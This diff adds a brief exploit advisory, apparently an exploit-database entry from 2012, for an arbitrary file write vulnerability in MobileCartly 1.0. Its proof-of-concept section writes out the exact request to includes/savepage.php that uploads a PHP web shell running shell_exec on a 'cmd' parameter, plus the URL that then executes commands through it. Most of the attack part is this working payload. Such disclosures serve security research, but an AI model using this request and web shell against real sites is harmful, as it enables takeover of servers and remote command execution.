@@ -1,0 +1,29 @@
+# -----------------------------------------------------------
+#			   _____ _ _            _      _ 
+#			  / ____(_) |          | |    | |
+#			 | |     _| |_ __ _  __| | ___| |
+#			 | |    | | __/ _` |/ _` |/ _ \ |
+#			 | |____| | || (_| | (_| |  __/ |
+#			  \_____|_|\__\__,_|\__,_|\___|_|
+#			  
+# -----------------------------------------------------------
+# MobileCartly 1.0 Arbitrary File Write Vulnerability
+# Bug discovered by Yakir Wizman AKA Pr0T3cT10n, <yakir.wizman@gmail.com>
+# Date 10/08/2012
+# Download - http://mobilecartly.com/mobilecartly.zip
+# ISRAEL
+# -----------------------------------------------------------
+#		Author will be not responsible for any damage.
+# -----------------------------------------------------------
+# I. DESCRIPTION
+# -----------------------------------------------------------
+# The application is prone to arbitrary file write / overwrite vulnerability.
+#
+# -----------------------------------------------------------
+# II. PoC EXPLOIT
+# -----------------------------------------------------------
+# http://127.0.0.1/mobilecartly/includes/savepage.php?savepage=FILENAME&pagecontent=CODE
+# FILENAME for example 'shell.php'
+# CODE for example '<?php echo(shell_exec($_GET['cmd'])); ?>'
+# Result example http://127.0.0.1/mobilecartly/pages/shell.php?cmd=dir
+# -----------------------------------------------------------
